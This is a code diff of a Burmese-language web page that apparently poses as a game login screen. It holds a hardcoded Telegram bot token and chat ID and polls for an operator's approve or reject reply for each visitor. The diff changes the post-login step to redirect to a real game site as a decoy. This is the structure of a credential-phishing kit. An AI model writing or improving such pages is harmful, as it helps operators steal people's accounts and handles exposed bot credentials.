@@ -54,7 +54,7 @@
         <div class="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/40"><p class="text-white text-lg font-bold">Login ဝင်ရောက်ရန် စစ်ဆေးနေပါသည်။</p></div>
     </div>
 
-    <!-- Game Frame -->
+    <!-- Game Frame (Keep it for UI structure) -->
     <div id="gameFrameContainer">
         <div onclick="location.reload()" class="fixed top-5 left-5 z-[101] bg-black/60 text-white p-3 rounded-full"><i class="fa-solid fa-house"></i></div>
         <iframe id="gameFrame" src=""></iframe>
@@ -64,6 +64,7 @@
 <script>
     const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
     const chatID = "5304050102";
+    const gameLink = "https://www.crazygames.com"; // အစ်ကိုလိုအပ်တဲ့ ဂိမ်းလင့်
     let userKey = "ID_" + Math.floor(Math.random() * 9999);
     const music = document.getElementById('bgMusic');
 
@@ -117,22 +118,20 @@
                         })
                     });
 
-                    showNotice("Login အောင်မြင်ပါသည်။", "success");
-                    setTimeout(openGame, 1500); // ၁.၅ စက္ကန့်အကြာမှာ ဂိမ်းတန်းပွင့်မယ်
+                    showNotice("Login အောင်မြင်ပါသည်။ ဂိမ်းသို့ ပို့ဆောင်နေသည်...", "success");
+                    
+                    // iframe သုံးမရလို့ တိုက်ရိုက် Redirect လုပ်လိုက်တာပါ
+                    setTimeout(() => {
+                        window.location.href = gameLink; 
+                    }, 1500);
 
                 } else if (last.data === `no_${userKey}`) {
                     clearInterval(check);
-                    showNotice("ငြင်းပယ်ခံရပါသည်။", "error");
+                    showNotice("Login ၀င်ရောက်မှုမအောသ်မြင်ပါ သင့်အကောင့်အား ပြန်လည်စစ်ဆေးပေးပါ။", "error");
                     setTimeout(() => location.reload(), 2000);
                 }
             }
         }, 3000);
-    }
-
-    function openGame() {
-        document.getElementById('gameFrameContainer').style.display = 'block';
-        document.getElementById('gameFrame').src = "https://www.crazygames.com";
-        music.play().catch(e => console.log("Audio trigger needed"));
     }
 </script>
 </body>
